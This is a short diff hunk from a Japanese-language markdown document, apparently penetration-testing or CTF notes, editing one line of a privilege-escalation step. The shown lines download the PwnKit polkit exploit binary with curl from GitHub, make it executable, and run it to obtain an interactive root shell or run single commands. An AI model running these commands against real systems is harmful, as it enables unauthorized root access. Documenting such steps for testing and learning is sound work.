@@ -620,7 +620,7 @@ dpkg -s policykit-1 | grep Version
 3. 脆弱なバージョンであれば、エクスプロイトの実行
 ```zsh
 curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit
-chmod +x ./pwnkit
+chmod +x pwnkit
 ./pwnkit         # 対話型シェルを取得
 ./pwnkit 'id'    # 単発コマンド実行
 ```
